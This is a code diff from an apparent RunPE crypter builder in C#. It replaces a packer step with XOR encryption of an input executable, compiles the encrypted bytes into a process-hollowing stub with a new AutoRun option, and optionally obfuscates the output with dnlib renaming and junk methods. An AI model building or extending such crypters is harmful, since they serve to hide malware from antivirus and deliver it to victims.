@@ -1,12 +1,13 @@
 ﻿using dnlib.DotNet;
+using RunPEBuilder.RunSrc;
 using System;
 using System.IO;
 
 namespace RunPEBuilder.Include
 {
-    internal class Runtime
+    internal class RuntimeEngine
     {
-        public static string RuntimeMain(string InFile, string OutFile, string processName, bool obfuscate)
+        public static string RuntimeMain(string InFile, string OutFile, string processName, bool obfuscate, bool AutoRun)
         {
             if (new FileInfo(InFile).Length == 0)
             {
@@ -14,40 +15,35 @@ namespace RunPEBuilder.Include
             }
             try
             {
-                byte[] packedBytes = PckMethod.Pack(File.ReadAllBytes(InFile), processName, PckMethod.DotNetVersion.v4_0);
-                if (packedBytes == null)
-                {
-                    return "Error: Packing failed.";
-                }
+                string XorKey = EncryptEngine.GenerateRandomXorKey(25);
+                string AppBytes = EncryptEngine.EncryptFile(InFile, XorKey);
 
-                File.WriteAllBytes(OutFile, packedBytes);
+                bool isCompiled = CompileEngine.Compilate(AppBytes, processName, XorKey, OutFile, AutoRun);
+
                 if (obfuscate)
                 {
-                    // Rename output file for obfuscation
                     string tempFile = Path.Combine(Path.GetDirectoryName(OutFile), $"sample_{Path.GetFileName(OutFile)}");
                     File.Move(OutFile, tempFile);
 
-                    // Load the module from the temp file without locking it
                     using (var stream = new FileStream(tempFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
                         var module = ModuleDefMD.Load(stream);
 
-                        // Execute obfuscation
                         RenameProtector.Execute(module, tempFile);
                         JunkMethods.Execute(module, tempFile);
 
-                        // Ensure to write the module after closing the stream
                         module.Write(tempFile);
                     }
 
-                    // Move back to original output file
                     File.Move(tempFile, OutFile);
                 }
-                return "File builded and obfuscated successfully!";
+
+                return "File built successfully!";
             }
+
             catch (Exception ex)
             {
-                return $"Error: {ex.Message}";
+                return $"Build Error: {ex.Message}";
             }
         }
     }
